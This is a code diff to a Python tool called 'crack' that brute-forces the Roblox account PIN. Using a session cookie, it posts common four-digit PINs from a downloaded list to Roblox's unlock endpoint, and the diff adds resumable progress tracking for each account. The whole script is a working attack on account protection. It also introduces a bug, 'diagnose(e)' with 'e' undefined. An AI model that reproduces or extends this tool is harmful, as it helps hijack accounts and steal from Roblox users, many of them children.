@@ -1,5 +1,5 @@
 # --({ Import Modules })
-import requests, time, os, subprocess
+import subprocess, requests, json, time, os
 try:
   from termcolor import cprint
 except:
@@ -109,7 +109,7 @@ class crack:
     check = requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)}) #check if the cookie is valid  
     if not check.status_code ==200:
       print("[", end="")
-      cprint(" ERROR ", "magenta", end="")
+      cprint(" ERROR ", "red", end="")
       print("] ", end="")
       cprint("Invalid Cookie", "red")
       time.sleep(1)
@@ -128,11 +128,11 @@ class crack:
     # --({ Allow cprint to work in windows }) -- #
     os.system("")
     crack.check()
-    if not os.path.exists("currentNumber.txt"):
+    if not os.path.exists("progress.json"):
       print("[", end="")
       cprint(" ERROR ", "magenta", end="")
       print("] ", end="")
-      cprint("Missing currentNumer.txt", "red")
+      cprint("Missing progress.json", "red")
       time.sleep(1)
       if os.name == 'nt':
           os.system("cls")
@@ -149,6 +149,7 @@ class crack:
     cookies = {
     '.ROBLOSECURITY': cookie
     }
+    userid = requests.get("https://users.roblox.com/v1/users/authenticated",cookies=cookies).json()['id']
     while True:
       headers = {
       'X-CSRF-TOKEN': getXsrf(cookie),
@@ -159,13 +160,18 @@ class crack:
         os.system("clear")
       if continueProgress:
         try:
-          startingLine = int(open("currentNumber.txt", "r").read())
+          startingLine = json.load(open("progress.json", "r"))[str(userid)]
         except:
           print("[", end="")
           cprint(" ERRORS ", "red", end="")
           print("] " , end="")
-          cprint(f"The number inside the currentNumber.txt file is invalid", 'red')
+          cprint(f"There is no progress saved inside for this account progress.json", 'red')
           time.sleep(2)
+          if os.name == 'nt':
+            os.system("cls")
+          else:
+            os.system("clear")
+          crack.check()
         pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()][startingLine:9998]
       else:
         startingLine = 0
@@ -175,7 +181,10 @@ class crack:
         cprint(" BRUTEFORCER ", "magenta", end="")
         print("] " , end="")
         cprint(f"Trying {pin}...", "magenta")
-        open("currentNumber.txt", "w+").write(str(line+startingLine))
+        progress = json.load(open("progress.json", "r"))
+        with open("progress.json", "w+") as f:
+          progress[str(userid)] = int(line+startingLine)
+          json.dump(progress, f, indent=1)
         response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies).json()
         try:
           if "unlockedUntil" in str(response):
@@ -222,18 +231,18 @@ class crack:
       else:
         print("[", end="")
         cprint(" ERROR ", "red", end="")
-        print("]" , end="")
+        print("] " , end="")
         cprint("Invalid Cookie", 'red')
-        os.system('cls')
         if os.name == 'nt':
             os.system("cls")
         else:
             os.system("clear")
+        
 
 # --({ Start program }) -- #
 if __name__ == "__main__":
   crack = crack()
   try:
     crack.start()
-  except Exception as error:
-    diagnose(error)
+  except:
+    diagnose(e)
